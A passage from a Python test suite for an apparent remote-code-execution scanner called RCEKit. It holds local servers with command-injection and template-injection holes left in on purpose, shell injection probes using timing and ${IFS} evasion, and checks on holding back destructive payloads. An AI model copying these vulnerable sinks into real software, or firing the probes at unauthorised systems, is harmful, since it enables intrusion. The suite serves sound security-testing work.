        import time as _time
        import urllib.parse as up

        def make_handler(vulnerable):
            class Handler(http.server.BaseHTTPRequestHandler):
                def log_message(self, *a):
                    pass

                def do_GET(self):
                    cmd = up.parse_qs(up.urlparse(self.path).query).get("host", [""])[0]
                    match = _re.search(r"sleep ([0-9.]+)", cmd)
                    if vulnerable and match:
                        _time.sleep(float(match.group(1)))
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b"ok")
            return Handler

        def run(vulnerable):
            server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), make_handler(vulnerable))
            port = server.server_address[1]
            threading.Thread(target=server.serve_forever, daemon=True).start()
            try:
                rec = make_record(environment="unix", context="raw", expected_channel="timing")
                return self.gen.run_detection(
                    [rec], url=f"http://127.0.0.1:{port}/x?host=FUZZ", methods=["time"],
                    config={"time_base": 0.6, "time_repeats": 2})
            finally:
                server.shutdown()
                server.server_close()

        vuln = run(vulnerable=True)
        self.assertTrue(vuln)
        self.assertEqual(vuln[0]["verdict"], "timing-sink")
        self.assertEqual(vuln[0]["tier"], "timing-sink")
        self.assertFalse([r for r in vuln if r["verdict"] == rcekit.EXECUTION_TIER],
                         "timing must never prove execution on its own")
        # And not under the candidate tier either, which is what it used to
        # report against this very sink.
        self.assertFalse([r for r in vuln if r["verdict"] == "needs-review"],
                         "a settled regression is not a candidate")

        flat = run(vulnerable=False)
        self.assertEqual(flat[0]["verdict"], "negative")


class EvalExprTestCase(unittest.TestCase):
    """Phase 5 — code/expression injection (SSTI, SpEL, OGNL, Groovy, raw eval).
    Inject a*b on random operands in each common template syntax and confirm the
    product appears while the literal a*b does not — the computed-value invariant
    for an expression evaluator."""

    def setUp(self):
        self.gen = RCEKit()
        self.method = EvalExpr(self.gen)

    def test_build_probes_cover_common_expression_syntaxes(self):
        import random as _random
        probes = self.method.build_probes(make_record(environment="python", context="raw", sink="ssti"),
                                          _random.Random(5))
        joined = " ".join(p.payload for p in probes)
        for delim in ("${", "{{", "#{", "%{", "<%=", "@("):
            self.assertIn(delim, joined)
        expr = next(p.forbidden for p in probes if not p.carrier)
        left, right = expr.split("*")
        for probe in probes:
            # expected is the product, and no payload ever hands the target its
            # own answer -- that is the whole oracle.
            self.assertNotIn(probe.expected, probe.payload)
            # Every payload is parameterised by this run's operands. `forbidden
            # in payload` used to stand in for that, but it only held while
            # every payload spelled the joined `a*b` out; a carrier for an
            # engine that multiplies through a filter writes
            # `{{ a | times: b }}` and never does.
            self.assertIn(left, probe.payload, probe.carrier or "bare")
            self.assertIn(right, probe.payload, probe.carrier or "bare")
        for probe in probes:
            if not probe.carrier:
                self.assertIn(probe.forbidden, probe.payload)

    def test_confirm_evaluation_vs_reflection_vs_boundary(self):
        import random as _random
        probe = self.method.build_probes(make_record(environment="python", context="raw"),
                                         _random.Random(5))[1]
        # Evaluated: product present, literal absent.
        self.assertEqual(
            self.method.confirm(Observation(200, f"= {probe.expected} =", control_body="x"), probe).status,
            "executed")
        # Reflected: literal echoed, product never produced.
        self.assertEqual(
            self.method.confirm(Observation(200, f"= {probe.forbidden} =", control_body="x"), probe).status,
            "negative")
        # Product embedded in a longer digit run must not match (digit boundary).
        self.assertEqual(
            self.method.confirm(Observation(200, f"id={probe.expected}00", control_body="x"), probe).status,
            "negative")
        # Present without the payload too -> inconclusive.
        self.assertEqual(
            self.method.confirm(Observation(200, probe.expected, control_body=probe.expected), probe).status,
            "inconclusive")

    def test_eval_end_to_end_against_evaluating_sink(self):
        # /ssti evaluates a bare `a*b` (or one wrapped in ${...}/{{...}}/...);
        # /reflect echoes input verbatim. EvalExpr must confirm on the former only.
        import http.server
        import re as _re
        import socketserver
        import threading
        import urllib.parse as up

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                parsed = up.urlparse(self.path)
                raw = up.parse_qs(parsed.query).get("q", [""])[0]
                self.send_response(200)
                self.end_headers()
                if parsed.path == "/ssti":
                    # Simulate an expression evaluator: strip common delimiters,
                    # then evaluate a pure `int*int` expression.
                    expr = _re.sub(r"^[\$#%@]?\(?\{*=?\s*|\s*\}*\)?%?>?\s*$", "", raw)
                    expr = expr.strip("${}#%@()<>= ")
                    match = _re.fullmatch(r"(\d+)\*(\d+)", expr)
                    out = str(int(match.group(1)) * int(match.group(2))) if match else raw
                else:
                    out = raw
                try:
                    self.wfile.write(out.encode(errors="replace"))
                except BrokenPipeError:
                    pass

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            rec = make_record(environment="python", context="raw", sink="ssti")
            evaluated = self.gen.run_detection(
                [rec], url=f"http://127.0.0.1:{port}/ssti?q=FUZZ", methods=["eval"])
            self.assertTrue([r for r in evaluated if r["verdict"] == "executed"],
                            "EvalExpr must confirm against an expression evaluator")
            reflected = self.gen.run_detection(
                [rec], url=f"http://127.0.0.1:{port}/reflect?q=FUZZ", methods=["eval"])
            self.assertFalse([r for r in reflected if r["verdict"] == "executed"],
                             "a target that only echoes input must never be confirmed")
        finally:
            server.shutdown()
            server.server_close()


class EvadeTestCase(unittest.TestCase):
    """Phase 6 — `--evade low`. Default is clean canonical payloads; `low` applies
    a single low-touch transform (${IFS} for spaces) to Unix shell command probes
    only, and never to the file-write redirect (which ${IFS} would break)."""

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="unix", context="raw")

    def test_default_is_canonical_no_obfuscation(self):
        import random as _random
        probe = ReflectedMath(self.gen).build_probes(self.rec, _random.Random(1))[0]
        self.assertNotIn("${IFS}", probe.payload)
        self.assertIn(" ", probe.payload)

    def test_a_rung_does_not_change_what_is_built(self):
        """The rung is a retry for a refused probe, not a coating on the ladder.

        It used to substitute `${IFS}` into every probe at build time. Measured
        shape by shape against an unfiltered target that broke 8 shapes the
        canonical form executes and improved none, so the transform moved to
        where a filter actually refused something. What the ladder offers is
        the same at every rung now."""
        import random as _random
        for method, config in ((ReflectedMath, {}),
                               (ParametricTime, {"time_base": 2})):
            built = {}
            for rung in rcekit.EVASION_RUNGS:
                payloads = [p.payload for p in method(
                    self.gen, dict(config, evade=rung)).build_probes(
                        self.rec, _random.Random(1))]
                built[rung] = payloads
            with self.subTest(method=method.name):
                self.assertEqual(built["none"], built["low"])
                self.assertEqual(built["none"], built["high"])

    def test_the_rung_still_produces_a_space_free_payload_on_retry(self):
        # What `--evade low` is for, now applied where it is paid for.
        import random as _random
        probe = ReflectedMath(self.gen).build_probes(self.rec, _random.Random(1))[0]
        climbed = rcekit.evade_body(probe.payload, "low")
        self.assertIn("${IFS}", climbed)
        self.assertNotIn(" ", climbed)

    def test_file_write_stays_canonical_under_evade(self):
        import random as _random
        config = {"evade": "low", "webroot": "/var/www", "web_base_url": "http://t"}
        probe = FileBased(self.gen, config).build_probes(self.rec, _random.Random(1))[0]
        # The `>` redirect must not be broken by ${IFS}.
        self.assertNotIn("${IFS}", probe.payload)
        self.assertIn(" > ", probe.payload)

    def test_evade_low_still_confirms_against_shell_sink(self):
        import http.server
        import os
        import socketserver
        import threading
        import urllib.parse as up

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                cmd = up.parse_qs(up.urlparse(self.path).query).get("host", [""])[0]
                out = sh_popen("echo " + cmd + " 2>&1").read()
                self.send_response(200)
                self.end_headers()
                try:
                    self.wfile.write(out.encode(errors="replace"))
                except BrokenPipeError:
                    pass

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            results = self.gen.run_detection(
                [self.rec], url=f"http://127.0.0.1:{port}/vuln?host=FUZZ", methods=["reflected"],
                # `every`, because the carrier stop would otherwise end this
                # carrier as soon as a canonical shape confirms -- correctly,
                # since it has answered -- and the space-free shapes sit later
                # in the ladder. They are reached on the sink they are for: one
                # that refuses the canonical shapes, where nothing confirms
                # early. Measured: 10 sent here, 7 of them confirm.
                config={"evade": "low", "confirm_depth": "every"})
            confirmed = [r for r in results if r["verdict"] == "executed"]
            self.assertTrue(confirmed, "the ${IFS} variant must still execute and confirm")
            self.assertTrue(any("${IFS}" in r["payload"] for r in confirmed),
                            "no space-free payload executed against a shell sink")
        finally:
            server.shutdown()
            server.server_close()


class DetectionRobustnessTestCase(unittest.TestCase):
    """Supplementary regression tests distilled from validating RCEKit against a
    local VulnHub-class range: guarantees not otherwise locked in — encoding
    resilience, probe redundancy, and (most importantly) false-positive
    resistance, the tool's core promise."""

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="unix", context="raw")

    def test_confirms_through_base64_encoded_output(self):
        # A sink whose command output is base64-encoded must still confirm:
        # _encoded_search peels the wrapper and finds the computed value.
        import base64
        import os

        def route(method, path, params, headers, body):
            pipe = sh_popen("echo " + params.get("host", "") + " 2>&1")
            out = pipe.read()
            pipe.close()
            return 200, base64.b64encode(out.encode()).decode()

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/b64?host=FUZZ", methods=["reflected"])
            self.assertTrue([r for r in results if r["verdict"] == "executed"],
                            "base64-encoded command output must still confirm")

    def test_backtick_variant_survives_a_dollar_paren_filter(self):
        # A sink that strips "$(" defeats the $((..)) probe but not the backtick
        # `expr` variant — probe redundancy keeps the detection alive.
        import os

        def route(method, path, params, headers, body):
            ip = params.get("ip", "").replace("$(", "")
            pipe = sh_popen("ping -c 1 " + ip + " 2>&1")
            out = pipe.read()
            pipe.close()
            return 200, "PING " + ip + "\n" + out

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/filter?ip=FUZZ", methods=["reflected"])
            self.assertTrue([r for r in results if r["verdict"] == "executed"],
                            "the backtick variant must survive a $( filter")

    def test_eval_is_not_fooled_by_random_numbers_in_the_page(self):
        # A page full of large random numbers (session ids, timestamps) must not
        # trick EvalExpr: the product is boundary-fenced and differenced against
        # the payload-free control.
        import random as _random

        def route(method, path, params, headers, body):
            return 200, f"session={_random.randint(10**7, 10**8)} ts={_random.randint(10**7, 10**8)}"

        with local_target(route) as base:
            results = self.gen.run_detection(
                [make_record(environment="python", context="raw")],
                url=f"{base}/x?q=FUZZ", methods=["eval"])
            self.assertFalse([r for r in results if r["verdict"] == "executed"],
                             "random numbers on the page must not be a false positive")

    def test_timing_is_not_fooled_by_random_latency(self):
        # A target with random per-request latency (but no injection) must not
        # confirm: the regression needs the response time to track the injected
        # delay linearly, which jitter cannot.
        import random as _random
        import time as _time

        def route(method, path, params, headers, body):
            _time.sleep(_random.uniform(0, 0.2))
            return 200, "ok"

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/x?q=FUZZ", methods=["time"],
                config={"time_base": 0.6})
            self.assertFalse([r for r in results if r["verdict"] == "executed"],
                             "random latency must never be confirmed")
            self.assertTrue(all(r["verdict"] == "negative" for r in results),
                            "a non-linear latency response is negative, not even a candidate")


class ReflectionControlTestCase(unittest.TestCase):
    """The paired same-token control decides reflection from execution, so it
    must fire whenever the verdict's own encoded-aware search matched. Gating it
    on a plain regex let a target that wraps its output (base64/hex/url/html)
    skip the control entirely and be reported 'confirmed' on pure reflection —
    exactly the case _encoded_search exists for."""

    def setUp(self):
        self.gen = RCEKit()
        self.token = "AB12CD"
        self.record = make_record(
            payload="; echo " + self.token, mode="detection", category="detection",
            safety="safe", token=self.token, match=re.escape(self.token))

    def test_encoded_reflection_is_inconclusive_not_confirmed(self):
        import base64

        def route(method, path, params, headers, body):
            # Echoes the parameter back, base64-wrapped. Nothing is ever executed.
            return 200, base64.b64encode(("you sent " + params.get("q", "")).encode()).decode()

        with local_target(route) as base:
            results = self.gen.run_verification([self.record], url=f"{base}/echo?q=FUZZ")
        self.assertEqual(len(results), 1)
        self.assertEqual(results[0]["verdict"], "inconclusive", results[0])

    def test_genuine_execution_still_confirms_through_an_encoded_wrapper(self):
        import base64

        def route(method, path, params, headers, body):
            # Stands in for a real sink: only a command break-out yields output,
            # so the inert same-token control comes back empty-handed.
            query = params.get("q", "")
            echoed = query.split("echo ", 1)[1] if query.startswith("; echo ") else ""
            out = f"command output follows: {echoed}" if echoed else "nothing executed here"
            return 200, base64.b64encode(out.encode()).decode()

        with local_target(route) as base:
            results = self.gen.run_verification([self.record], url=f"{base}/sink?q=FUZZ")
        self.assertEqual(len(results), 1)
        self.assertEqual(results[0]["verdict"], "executed", results[0])


class CompressedResponseTestCase(unittest.TestCase):
    """A gzipped body carries the computed value without spelling it, so an
    oracle reading the raw bytes reports `negative` on a target that executed.

    Measured on Apache HugeGraph 1.2.0, which gzips its 200s and leaves its 4xx
    plain: the same run confirmed through a 400 carrying a Groovy exception and
    missed the 200 carrying real command execution. These hold the decode in
    place and hold the oracle to the same standard through it — a compressed
    response must not become a cheaper route to `executed`."""

    def setUp(self):
        self.gen = RCEKit()
        self.token = "AB12CD"
        self.record = make_record(
            payload="; echo " + self.token, mode="detection", category="detection",
            safety="safe", token=self.token, match=re.escape(self.token))

    @staticmethod
    def _gzip(text):
        import gzip
        return gzip.compress(text.encode())

    def test_gzip_body_is_decoded(self):
        self.assertEqual(decode_response_body(self._gzip("computed 1214788"), "gzip"),
                         "computed 1214788")

    def test_header_casing_and_whitespace_do_not_matter(self):
        self.assertEqual(decode_response_body(self._gzip("ok"), "  GZip "), "ok")

    def test_deflate_is_decoded_in_both_forms_that_ship_under_that_name(self):
        import zlib
        wrapped = zlib.compress(b"zlib-wrapped")
        raw = zlib.compressobj(wbits=-zlib.MAX_WBITS)
        bare = raw.compress(b"raw-deflate") + raw.flush()
        self.assertEqual(decode_response_body(wrapped, "deflate"), "zlib-wrapped")
        self.assertEqual(decode_response_body(bare, "deflate"), "raw-deflate")

    def test_stacked_encodings_are_undone_last_applied_first(self):
        import gzip
        doubled = gzip.compress(self._gzip("twice"))
        self.assertEqual(decode_response_body(doubled, "gzip, gzip"), "twice")

    def test_absent_or_identity_encoding_passes_the_body_through(self):
        for header in (None, "", "identity"):
            self.assertEqual(decode_response_body(b"plain body", header), "plain body")

    def test_an_encoding_the_stdlib_cannot_undo_returns_the_raw_body(self):
        # `br` and `zstd` need a third-party module and this tool has none to
        # add. The probe is lost either way; ending the run is the outcome
        # worth avoiding, since hundreds of probes may already have been spent.
        self.assertEqual(decode_response_body(b"\x1b\x07\x00brotli", "br"), "\x1b\x07\x00brotli")

    def test_a_body_that_lies_about_its_encoding_does_not_raise(self):
        self.assertEqual(decode_response_body(b"not actually gzip", "gzip"),
                         "not actually gzip")
        truncated = self._gzip("cut short")[:12]
        self.assertIsInstance(decode_response_body(truncated, "gzip"), str)

    def test_a_decompression_bomb_is_bounded(self):
        # A target chooses how much memory RCEKit allocates the moment it
        # compresses, and one-shot decompression handed it a blank cheque:
        # 203,860 bytes of gzip hold 200 MB of zeros. The ceiling has to hold
        # for both names, and the call has to come back rather than allocate.
        import gzip
        import zlib
        from rcekit import MAX_DECOMPRESSED_BODY
        payload = b"\x00" * (MAX_DECOMPRESSED_BODY * 4)
        for header, blob in (("gzip", gzip.compress(payload, 9)),
                             ("deflate", zlib.compress(payload, 9))):
            self.assertLess(len(blob), len(payload) // 100, header)
            body = decode_response_body(blob, header)
            self.assertEqual(len(body), MAX_DECOMPRESSED_BODY, header)

    def test_a_body_just_under_the_ceiling_is_decoded_whole(self):
        # The ceiling must bound a bomb without truncating an ordinary large
        # response, or it has traded a crash for a silent false negative.
        from rcekit import MAX_DECOMPRESSED_BODY
        text = "x" * (MAX_DECOMPRESSED_BODY - 64) + "computed 1214788"
        self.assertTrue(decode_response_body(self._gzip(text), "gzip")
                        .endswith("computed 1214788"))

    def test_a_multi_member_gzip_stream_is_followed(self):
        # `gzip.decompress` followed concatenated members, so the bounded
        # reader must too -- a ceiling that quietly became a truncation for a
        # server that concatenates would be the same false negative in a new
        # place.
        both = self._gzip("computed ") + self._gzip("1214788")
        self.assertEqual(decode_response_body(both, "gzip"), "computed 1214788")

    def test_execution_confirms_through_a_gzipped_response(self):
        # The regression. This sink executes -- only a command break-out yields
        # output -- and returns it gzipped, exactly as HugeGraph does. Before
        # the decode this came back `negative`: not "unreadable", but "the
        # probes reached the target and it is not vulnerable".
        def route(method, path, params, headers, body):
            query = params.get("q", "")
            echoed = query.split("echo ", 1)[1] if query.startswith("; echo ") else ""
            out = f"command output follows: {echoed}" if echoed else "nothing executed here"
            return 200, self._gzip(out), [("Content-Encoding", "gzip")]

        with local_target(route) as base:
            results = self.gen.run_verification([self.record], url=f"{base}/sink?q=FUZZ")
        self.assertEqual(len(results), 1)
        self.assertEqual(results[0]["verdict"], "executed", results[0])

    def test_reflection_through_a_gzipped_response_still_does_not_confirm(self):
        # The fix widens what the oracle can read, not what counts as proof. A
        # target that only echoes must stay unconfirmed through the decode, or
        # decompression has become a route to `executed` that execution is not.
        def route(method, path, params, headers, body):
            return 200, self._gzip("you sent " + params.get("q", "")), \
                [("Content-Encoding", "gzip")]

        with local_target(route) as base:
            results = self.gen.run_verification([self.record], url=f"{base}/echo?q=FUZZ")
        self.assertEqual(len(results), 1)
        self.assertNotEqual(results[0]["verdict"], "executed", results[0])

    def test_an_error_body_is_decoded_too(self):
        # The evaluator that surfaces its value only in a 500 or a 400 is the
        # case the non-2xx read exists for, and it reaches the oracle through a
        # different branch -- the HTTPError one -- which the success path's
        # decode does not cover.
        def route(method, path, params, headers, body):
            query = params.get("q", "")
            echoed = query.split("echo ", 1)[1] if query.startswith("; echo ") else ""
            out = f"stack trace: {echoed}" if echoed else "nothing executed here"
            return 500, self._gzip(out), [("Content-Encoding", "gzip")]

        with local_target(route) as base:
            results = self.gen.run_verification([self.record], url=f"{base}/sink?q=FUZZ")
        self.assertEqual(len(results), 1)
        self.assertEqual(results[0]["verdict"], "executed", results[0])


class InsecureDowngradeNoticeTestCase(unittest.TestCase):
    """`--insecure` now gives up more than certificate identity, so the run says
    so. An operator on a monitored engagement should read the full extent in the
    transcript rather than infer it from a help string."""

    def _run(self, *extra):
        return subprocess.run(
            [sys.executable, str(SCRIPT), "--acknowledge-consent", "--categories", "basic_enum",
             "--environments", "unix", "--max-payloads", "1",
             "--verify-url", "https://127.0.0.1:1/?q=FUZZ", *extra],
            cwd=str(REPO_ROOT), capture_output=True, text=True, timeout=120)

    def test_the_downgrade_is_stated_when_it_is_taken(self):
        result = self._run("--insecure")
        self.assertIn("--insecure", result.stdout)
        self.assertIn("downgraded", result.stdout)
        self.assertIn("no authenticity guarantee", result.stdout)

    def test_a_run_without_the_flag_says_nothing_about_a_downgrade(self):
        # The notice must describe this run, not TLS in general.
        result = self._run()
        self.assertNotIn("downgraded", result.stdout)

    def test_a_plain_http_target_is_not_told_its_tls_was_downgraded(self):
        # urllib ignores an SSL context on http://, so nothing was downgraded.
        # Announcing it anyway is the same defect as reporting a probe that was
        # never sent, in the one line written to be an audit of the run.
        result = subprocess.run(
            [sys.executable, str(SCRIPT), "--acknowledge-consent", "--categories", "basic_enum",
             "--environments", "unix", "--max-payloads", "1", "--insecure",
             "--verify-url", "http://127.0.0.1:1/?q=FUZZ"],
            cwd=str(REPO_ROOT), capture_output=True, text=True, timeout=120)
        self.assertNotIn("downgraded", result.stdout)

    def test_a_run_that_opens_no_connection_says_nothing_either(self):
        # Generation only: --insecure is accepted, no TLS context is ever built.
        with tempfile.TemporaryDirectory() as tmp:
            result = subprocess.run(
                [sys.executable, str(SCRIPT), "--acknowledge-consent", "--categories",
                 "basic_enum", "--environments", "unix", "--max-payloads", "1", "--insecure",
                 "-o", str(Path(tmp) / "out.txt")],
                cwd=str(REPO_ROOT), capture_output=True, text=True, timeout=120)
        self.assertNotIn("downgraded", result.stdout)

    def test_the_notice_names_only_the_rungs_that_took(self):
        # A build may refuse either rung; the line must report what was applied,
        # not what was asked for.
        import contextlib
        import io
        import ssl

        generator = RCEKit()
        generator.insecure = True
        buffer = io.StringIO()
        with contextlib.redirect_stdout(buffer):
            ctx = generator._verify_ssl_context()
            generator._announce_insecure("https://target.example/")
        printed = buffer.getvalue()
        self.assertIn("no certificate or hostname check", printed)
        self.assertEqual("OpenSSL security level 0" in printed,
                         {c["name"] for c in ctx.get_ciphers()}
                         != {c["name"] for c in ssl.create_default_context().get_ciphers()})
        self.assertEqual("TLS 1.0 allowed" in printed,
                         ctx.minimum_version == ssl.TLSVersion.TLSv1)

    def test_the_context_survives_a_redirect_into_tls(self):
        """An `http://` target may land on a self-signed `https://` one.

        urllib follows a redirect with the handler it was given, so gating the
        context on the *original* scheme made `--insecure` stop working on
        exactly the flow an operator reaches for it on: the redirected request
        went out through the default verifying handler and failed, with the flag
        set. The context is built whatever the scheme; only the notice waits to
        learn whether TLS was really used."""
        generator = RCEKit()
        generator.insecure = True
        self.assertIsNotNone(generator._verify_ssl_context(),
                             "the permissive context must exist for a possible redirect")
        generator_without = RCEKit()
        self.assertIsNone(generator_without._verify_ssl_context(),
                          "a run that did not ask still verifies certificates")

    def test_a_redirect_into_tls_is_announced_after_the_fact(self):
        # The notice follows the connection, not the argument: nothing is said
        # for the http:// target, and it is said once the response reveals TLS.
        import contextlib
        import io

        generator = RCEKit()
        generator.insecure = True
        generator._verify_ssl_context()
        buffer = io.StringIO()
        with contextlib.redirect_stdout(buffer):
            generator._announce_insecure("http://target.example/")
            self.assertEqual(buffer.getvalue(), "", "plain HTTP announces nothing")
            generator._announce_insecure("https://target.example/after")
        self.assertIn("--insecure:", buffer.getvalue())

    def test_the_notice_is_printed_once_per_run(self):
        import contextlib
        import io
        generator = RCEKit()
        generator.insecure = True
        buffer = io.StringIO()
        with contextlib.redirect_stdout(buffer):
            for _ in range(5):
                generator._verify_ssl_context()
                generator._announce_insecure("https://target.example/")
        self.assertEqual(buffer.getvalue().count("--insecure:"), 1)


class CLIExitCodeTestCase(unittest.TestCase):
    """Every refusal to run must exit non-zero so CI and wrapper scripts can
    branch on the status instead of scraping stdout. A completed run exits 0
    even when it confirmed nothing — that is a result, not a failure."""

    def _run(self, *args):
        return subprocess.run(
            [sys.executable, str(SCRIPT), *args],
            cwd=str(REPO_ROOT), capture_output=True, text=True, timeout=120,
        )

    def test_missing_consent_exits_non_zero(self):
        result = self._run("--categories", "basic_enum", "--environments", "unix")
        self.assertEqual(result.returncode, 1)
        self.assertIn("consent", result.stdout.lower())

    def test_unloadable_target_profile_exits_non_zero(self):
        result = self._run("--acknowledge-consent", "--target-profile", "/no/such/profile.json")
        self.assertEqual(result.returncode, 1)

    def test_verify_without_fuzz_marker_exits_non_zero(self):
        result = self._run("--acknowledge-consent", "--verify-url", "http://127.0.0.1:1/nomarker")
        self.assertEqual(result.returncode, 1)
        self.assertIn("FUZZ", result.stdout)

    def test_unknown_detection_method_exits_non_zero(self):
        result = self._run("--acknowledge-consent", "--categories", "basic_enum",
                           "--environments", "unix", "--max-payloads", "1",
                           "--methods", "nosuchmethod",
                           "--verify-url", "http://127.0.0.1:1/?q=FUZZ")
        self.assertEqual(result.returncode, 1)
        self.assertIn("Unknown --methods", result.stdout)

    def test_file_method_without_webroot_exits_non_zero(self):
        result = self._run("--acknowledge-consent", "--categories", "basic_enum",
                           "--environments", "unix", "--max-payloads", "1",
                           "--methods", "file",
                           "--verify-url", "http://127.0.0.1:1/?q=FUZZ")
        self.assertEqual(result.returncode, 1)
        self.assertIn("--webroot", result.stdout)

    def test_unreadable_request_file_exits_non_zero(self):
        result = self._run("--acknowledge-consent", "-r", "/no/such/request.txt")
        self.assertEqual(result.returncode, 1)

    def test_request_file_without_injection_point_exits_non_zero(self):
        with tempfile.TemporaryDirectory() as tmp:
            req = Path(tmp) / "req.txt"
            req.write_text("GET /a=1 HTTP/1.1\nHost: target.example\n\n")
            result = self._run("--acknowledge-consent", "-r", str(req))
            self.assertEqual(result.returncode, 1)

    def test_completed_generation_exits_zero(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "d.txt"
            result = self._run("--detection-only", "--environments", "unix", "-o", str(out))
            self.assertEqual(result.returncode, 0)


class DestructiveHoldBackTestCase(unittest.TestCase):
    """A payload that installs a backdoor or destroys data must be held back by
    default on EVERY live path. The single-request verifier did this and the
    multi-step chain did not, so the blast radius of a run depended on which
    delivery path it took."""

    def setUp(self):
        self.gen = RCEKit()

    def _records(self, max_safety):
        return list(self.gen.generate_payload_records(
            mode="exploit", max_safety=max_safety, include_blocking=False))

    def test_destructive_payloads_are_held_back_by_default(self):
        records = self._records("stateful")
        destructive = [r for r in records if r.destructive]
        self.assertTrue(destructive, "corpus should contain destructive payloads to exercise this")
        to_send, held = partition_destructive(records, allow_destructive=False)
        self.assertEqual(held, len(destructive))
        self.assertFalse([r for r in to_send if r.destructive])

    def test_opt_in_lets_them_through(self):
        records = self._records("stateful")
        to_send, held = partition_destructive(records, allow_destructive=True)
        self.assertEqual(held, 0)
        self.assertEqual(len(to_send), len(records))

    def test_chain_run_holds_back_destructive_payloads(self):
        # End-to-end through the CLI: the chain path must print the same
        # pre-flight plan and hold-back notice as --verify-url. Raising the risk
        # tier is what surfaces destructive payloads at all.
        with local_target(lambda *a: (200, "ok")) as base, tempfile.TemporaryDirectory() as tmp:
            chain = Path(tmp) / "chain.json"
            chain.write_text(json.dumps({
                "base": base,
                "steps": [{"name": "deliver", "method": "POST", "path": "/run",
                           "form": {"cmd": "FUZZ"}}],
            }))
            result = subprocess.run(
                [sys.executable, str(SCRIPT), "--acknowledge-consent",
                 "--categories", "file_operations", "--environments", "unix",
                 "--verify-active-risk", "stateful", "--max-payloads", "3",
                 "--verify-chain", str(chain)],
                cwd=tmp, capture_output=True, text=True, timeout=120)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("[plan]", result.stdout)
        self.assertIn("holding back", result.stdout)
        self.assertIn("--verify-allow-destructive", result.stdout)


class CleartextCaptureWarningTestCase(unittest.TestCase):
    """A portless capture stays http so lab and internal targets keep working,
    so the cleartext risk is surfaced instead of defaulted away: the inferred
    scheme is always reported, and a captured session about to go out in the
    clear is named."""

    def _run_with_request(self, raw, *extra):
        with tempfile.TemporaryDirectory() as tmp:
            req = Path(tmp) / "req.txt"
            # Bytes, not text. A capture is what came off the wire, and `raw`
            # already spells its own CRLF line endings -- writing it in text mode
            # translates the `\n` of each `\r\n` again, so the file on disk holds
            # `\r\r\n` and the parser finds no headers at all. The fixture then
            # tested the "could not build a request" path while claiming to test
            # the scheme notice.
            #
            # `write_text(..., newline="")` would say the same thing, but it
            # arrived in Python 3.10 and this project supports 3.8.
            req.write_bytes(raw.encode())
            return subprocess.run(
                [sys.executable, str(SCRIPT), "--acknowledge-consent",
                 "--categories", "basic_enum", "--environments", "unix",
                 "--max-payloads", "1", "-r", str(req), *extra],
                cwd=tmp, capture_output=True, text=True, timeout=120)

    def test_credential_header_over_plain_http_is_flagged(self):
        result = self._run_with_request(
            "GET /q?a=FUZZ HTTP/1.1\r\nHost: 127.0.0.1:1\r\n"
            "Authorization: Bearer secret\r\nCookie: session=abc\r\n\r\n")
        self.assertIn("inferred http", result.stdout)
        self.assertIn("replayed over plain HTTP", result.stdout)
        self.assertIn("Authorization", result.stdout)
        self.assertIn("Cookie", result.stdout)
        self.assertIn("--request-scheme", result.stdout)
        self.assertNotIn("secret", result.stdout)  # names the header, never its value

    def test_no_warning_without_credential_headers(self):
        result = self._run_with_request(
            "GET /q?a=FUZZ HTTP/1.1\r\nHost: 127.0.0.1:1\r\nAccept: */*\r\n\r\n")
        self.assertIn("inferred http", result.stdout)
        self.assertNotIn("replayed over plain HTTP", result.stdout)

    def test_no_warning_when_the_scheme_was_given_explicitly(self):
        result = self._run_with_request(
            "GET /q?a=FUZZ HTTP/1.1\r\nHost: 127.0.0.1:1\r\n"
            "Authorization: Bearer secret\r\n\r\n",
            "--request-scheme", "http")
        self.assertNotIn("inferred http", result.stdout)
        self.assertNotIn("replayed over plain HTTP", result.stdout)

    def test_the_capture_reaches_disk_byte_for_byte(self):
        """The fixture is the thing under test here, and it was broken.

        Two of the three tests above assert that something *is* printed, so they
        failed when the capture stopped parsing. The third asserts that nothing
        is printed — and passed throughout, for the wrong reason: a request that
        cannot be built prints no scheme notice either. A control that stays
        green while the fixture rots is exactly what this project refuses to
        accept from a benchmark case, so the fixture gets its own guard."""
        raw = "GET /q?a=FUZZ HTTP/1.1\r\nHost: 127.0.0.1:1\r\n\r\n"
        with tempfile.TemporaryDirectory() as tmp:
            req = Path(tmp) / "req.txt"
            req.write_bytes(raw.encode())
            on_disk = req.read_bytes()
        self.assertEqual(on_disk, raw.encode())
        self.assertNotIn(b"\r\r\n", on_disk)


class OutputFailureTestCase(unittest.TestCase):
    """The generated file IS the deliverable, so a write that failed must not be
    reported as a successful run."""

    def test_unwritable_output_path_exits_non_zero(self):
        result = subprocess.run(
            [sys.executable, str(SCRIPT), "--detection-only", "--environments", "unix",
             "-o", "/no/such/directory/out.txt"],
            cwd=str(REPO_ROOT), capture_output=True, text=True, timeout=120)
        self.assertEqual(result.returncode, 1)
        self.assertIn("Unable to write output", result.stdout)
        self.assertNotIn("Generated", result.stdout)

    def test_write_failure_propagates_to_the_caller(self):
        gen = RCEKit()
        with self.assertRaises(OSError):
            gen.save_payloads_to_file(
                file_path="/no/such/directory/out.txt", mode="detection",
                selected_environments=["unix"])


class AuditRedactionTestCase(unittest.TestCase):
    """The audit trail records what was fired and by whom. Verification headers
    routinely carry the session that makes the target reachable at all, and a
    credential must not be persisted to disk just to record that a header was
    sent."""

    def test_sensitive_header_values_are_masked(self):
        masked = RCEKit.redact_headers([
            "Authorization: Bearer SUPERSECRET",
            "Cookie: session=SUPERSECRET",
            "X-Api-Key: SUPERSECRET",
            "Content-Type: application/json",
        ])
